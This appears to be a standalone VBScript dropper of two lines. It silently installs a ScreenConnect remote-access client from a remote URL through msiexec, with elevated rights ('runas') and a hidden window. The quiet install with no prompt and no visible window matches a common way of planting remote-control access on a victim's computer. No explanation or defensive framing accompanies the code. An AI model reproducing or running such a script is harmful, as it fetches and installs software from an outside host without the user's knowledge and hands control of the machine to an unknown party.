Set oShell = CreateObject("Shell.Application")

oShell.ShellExecute "msiexec.exe", "/i https://nohescape.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest /quiet /norestart", "", "runas", 0

